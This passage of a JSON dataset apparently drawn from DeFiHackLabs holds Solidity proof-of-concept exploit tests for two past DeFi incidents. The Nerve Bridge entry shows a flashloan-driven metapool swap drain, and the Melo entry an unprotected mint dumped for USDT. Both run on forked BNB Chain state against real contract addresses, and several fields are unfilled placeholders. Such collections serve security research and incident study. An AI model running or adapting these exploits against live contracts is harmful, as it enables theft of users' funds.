swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "74e26922a3",
        "is_ready": false,
        "content": "### 20211214 Nerve Bridge - Swap Metapool Attack\n#### Lost: 900 BNB\n#### Contract\n[NerveBridge.t.sol](src/test/NerveBridge.t.sol)\n#### Link reference\nhttps://blocksecteam.medium.com/the-analysis-of-nerve-bridge-security-incident-ead361a21025",
        "date": "20211214",
        "target": "Nerve Bridge",
        "attack_title": "Swap Metapool Attack",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://blocksecteam.medium.com/the-analysis-of-nerve-bridge-security-incident-ead361a21025",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/NerveBridge.t.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// tx: https://bscscan.com/tx/0xea95925eb0438e04d0d81dc270a99ca9fa18b94ca8c6e34272fc9e09266fcf1d\ninterface IFortube {\n    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;\n}\ninterface ISaddle {\n    function swap(uint8 i,\n        uint8 j,\n        uint256 dx,\n        uint256 min_dy,\n        uint deadline) external returns (uint256);\n    function swapUnderlying(uint8 tokenIndexFrom,\n        uint8 tokenIndexTo,\n        uint256 dx,\n        uint256 minDy,\n        uint256 deadline) external returns (uint256);\n}\ninterface ISwap {\n    function removeLiquidityOneToken(uint256 tokenAmount,\n        uint8 tokenIndex,\n        uint256 minAmount,\n        uint256 deadline) external returns (uint256);\n}\ncontract ContractTest is Test {\n    uint256 mainnetFork;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IFortube flashloanProvider = IFortube(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);\n    address nerve3lp = 0xf2511b5E4FB0e5E2d123004b672BA14850478C14;\n    address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;\n    address fusd = 0x049d68029688eAbF473097a2fC38ef61633A3C7A;\n    address fusdPool = 0x556ea0b4c06D043806859c9490072FaadC104b63;\n    address metaSwapPool = 0xd0fBF0A224563D5fFc8A57e4fdA6Ae080EbCf3D3;\n    address nerve3pool = 0x1B3771a66ee31180906972580adE9b81AFc5fCDc;\n    function setUp() public {\n        mainnetFork = vm.createFork(\"bsc\", 12653565);\n        vm.selectFork(mainnetFork);\n        cheats.label(address(flashloanProvider), \"flashloanProvider\");\n    }\n    function testExp() public {\n        // 1. flashloan 50000 busd from fortube\n        flashloanProvider.flashloan(address(this), busd, 50000 ether, \"0x\");\n        console.log(\"final busd profit: \", IERC20(busd).balanceOf(address(this)) / 10 ** IERC20(busd).decimals());\n    }\n    function executeOperation(address token, uint256 amount, uint256 fee, bytes calldata params) external {\n        IERC20(busd).approve(fusdPool, type(uint).max);\n        IERC20(fusd).approve(metaSwapPool, type(uint).max);\n        IERC20(nerve3lp).approve(nerve3pool, type(uint).max);\n        IERC20(busd).approve(metaSwapPool, type(uint).max);\n        // 2. swap from 50000 busd to fusd on Ellipsis   \n        IERC20(fusd).approve(fusdPool, type(uint).max);\n        IcurveYSwap(fusdPool).exchange_underlying(1, 0, IERC20(busd).balanceOf(address(this)), 1);\n        for (uint8 i = 0; i < 7; i++) {\n            swap();\n        }\n        // 6. swap from fusd to busd on Ellipsis\n        IcurveYSwap(fusdPool).exchange_underlying(0, 1, IERC20(fusd).balanceOf(address(this)), 1);\n        // 7. payback flashloan\n        IERC20(busd).transfer(address(0xc78248D676DeBB4597e88071D3d889eCA70E5469), amount + fee);\n    }\n    function swap() public {\n        // 3. swap from fusd to Nerve 3-LP token on metaSwapPool\n        ISaddle(metaSwapPool).swap(0, 1, IERC20(fusd).balanceOf(address(this)), 1, block.timestamp);\n        // 4. remove liquidity Nerve.3pool with lp tokens to remove the liquidity of BUSD\n        ISwap(nerve3pool).removeLiquidityOneToken(IERC20(nerve3lp).balanceOf(address(this)), 0, 1, block.timestamp);\n        // 5. invoking the swapUnderlying function of MetaSwap to swap BUSD for fUSDT\n        ISaddle(metaSwapPool).swapUnderlying(1, 0, IERC20(busd).balanceOf(address(this)), 1, block.timestamp);\n    }\n}",
                "token_count": 1119,
                "interfaces": [
                    {
                        "name": "IFortube",
                        "content": "interface IFortube {\n    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;\n}\n",
                        "token_count": 26,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "6b994d1649",
        "is_ready": false,
        "content": "### 20230506 Melo - Access Control\n### Lost: ~$90k\n#### Contract\n[Melo_exp.sol](src/test/Melo_exp.sol)\n#### Link Reference\nhttps://twitter.com/peckshield/status/1654667621139349505",
        "date": "20230506",
        "target": "Melo",
        "attack_title": "Access Control",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/peckshield/status/1654667621139349505",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/Melo_exp.sol",
                "testcase": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/peckshield/status/1654667621139349505\n// @TX\n// https://bscscan.com/tx/0x3f1973fe56de5ecd59a815d3b14741cf48385903b0ccfe248f7f10c2765061f7\n// @Summary\n// critical function lack of access control\ninterface IMEL is IERC20 {\n    function mint(address account, uint256 amount, string memory txId) external returns (bool);\n}\ncontract ContractTest is Test {\n    IMEL MEL = IMEL(0x9A1aEF8C9ADA4224aD774aFdaC07C24955C92a54);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x6a8C4448763C08aDEb80ADEbF7A29b9477Fa0628);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 27_960_445);\n    }\n    function testExploit() external {\n        uint256 mintAmount = MEL.balanceOf(address(Pair)) * 50;\n        MEL.mint(address(this), mintAmount, \"\");\n        MEL.approve(address(Router), mintAmount);\n        address[] memory path = new address[](2);\n        path[0] = address(MEL);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(mintAmount, 0, path, address(this), block.timestamp);\n        emit log_named_decimal_uint(\"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals());\n    }\n}",
                "token_count": 503,
                "interfaces": [
                    {
                        "name": "IMEL",
                        "content": "interface IMEL is IERC20 {\n    function mint(address account, uint256 amount, string memory txId) external returns (bool);\n}\n",
                        "token_count": 29,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function 